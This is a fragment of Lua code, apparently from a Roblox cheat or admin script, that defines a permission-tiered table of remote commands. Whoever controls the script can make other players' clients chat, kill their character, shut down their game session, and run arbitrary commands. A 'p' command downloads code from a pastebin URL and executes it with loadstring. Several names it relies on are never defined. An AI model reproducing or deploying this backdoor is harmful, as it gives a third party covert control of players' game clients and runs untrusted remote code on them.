local b7 = {
    ["chat"] = {
        ["Func"] = function(b8, b9, ba)
            if b8 == LP or typeof(b8) == "table" then
                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(b9, "All")
            end
        end,
        ["Levels"] = {[1] = true, [2] = true, [3] = true, [4] = true}
    },
    ["notif"] = {
        ["Func"] = function(b8, b9, ba)
            if b8 == LP or typeof(b8) == "table" then
                StarterGui:SetCore(
                    "SendNotification",
                    {["Title"] = "Cy's Messages", ["Text"] = Message, ["Duration"] = 10, ["Icon"] = nil}
                )
            end
        end,
        ["Levels"] = {[4] = true}
    },
    ["bring"] = {
        ["Func"] = function(b8, b9, ba)
            if b8 == LP or typeof(b8) == "table" and ba ~= "none" then
                CheckCommand("to " .. ba.Name)
            end
        end,
        ["Levels"] = {[1] = true, [2] = true, [3] = true, [4] = true}
    },
    ["kill"] = {
        ["Func"] = function(b8, b9, ba)
            if b8 == LP or typeof(b8) == "table" then
                game.Players.LocalPlayer.Character.Head:BreakJoints()
            end
        end,
        ["Levels"] = {[2] = true, [3] = true, [4] = true}
    },
    ["exec"] = {
        ["Func"] = function(b8, b9, ba)
            if b8 == LP or typeof(b8) == "table" and ba ~= "none" then
                CheckCommand(b9)
            end
        end,
        ["Levels"] = {[3] = true, [4] = true}
    },
    ["kick"] = {
        ["Func"] = function(b8, b9, ba)
            if b8 == LP or typeof(b8) == "table" then
                game:Shutdown()
            end
        end,
        ["Levels"] = {[3] = true, [4] = true}
    },
    ["ban"] = {
        ["Func"] = function(b8, b9, ba)
            if b8 == LP or typeof(b8) == "table" then
                ReplicatedStorage.lIIl:FireServer "hipheight"
            end
        end,
        ["Levels"] = {[4] = true}
    },
    ["p"] = {
        ["Func"] = function(b8, b9, ba)
            if b8 == LP or typeof(b8) == "table" then
                loadstring(game:HttpGet("https://www.pastebin.com/raw/" .. b9))()
            end
        end,
        ["Levels"] = {[3] = true, [4] = true}
    }
}
